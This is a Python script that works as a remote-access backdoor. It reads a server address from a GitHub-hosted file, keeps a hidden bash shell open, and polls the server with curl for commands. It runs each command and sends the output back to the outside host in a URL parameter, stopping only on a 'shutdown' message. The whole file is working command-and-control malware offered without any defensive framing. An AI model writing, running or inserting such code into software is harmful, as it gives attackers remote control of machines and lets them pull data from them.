import subprocess
from urllib.parse import quote
import time
import random
import urllib.request 
github_url = "https://raw.githubusercontent.com/Kaiden-cyber/Digikeyboard-v2/refs/heads/main/site-url"
with urllib.request.urlopen(github_url) as response: 
    url = response.read().decode("utf-8").replace('\n', '')
data = ""

#open a shell session
shell = subprocess.Popen( ["bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1 )

hash = random.getrandbits(128)
MARK = ("%032x" % hash)

def run_persistent(cmd): 
    # send command 
    shell.stdin.write(cmd + "\n") 
    # send marker 
    shell.stdin.write(f"echo {MARK}\n") 
    shell.stdin.flush() 
    output = "" 
    #read until marker appears
    while True: 
        line = shell.stdout.readline() 
        if not line: 
            break 
        if MARK in line: 
            break 
        output += line 
    return output


while True:
    if subprocess.check_output(f"curl -s {url}/2362f23180fa3eab8a92a6269c2c0029", shell=True, text=True) != data:
        data = subprocess.check_output(f"curl -s {url}/2362f23180fa3eab8a92a6269c2c0029", shell=True, text=True)
        if data.lower() == "shutdown":
            subprocess.check_output(f"curl -s {url}/48ff1e22c70a20512510fea2adf39497/?msg={quote('Endpoint has been disabled')}", shell=True, text=True)
            exit()
        try:
            result = run_persistent(data)
        except:
            result = "Command is Invalid"
        subprocess.check_output(f"curl -s {url}/48ff1e22c70a20512510fea2adf39497/?msg={quote(result)}", shell=True, text=True)
    else:
        time.sleep(1)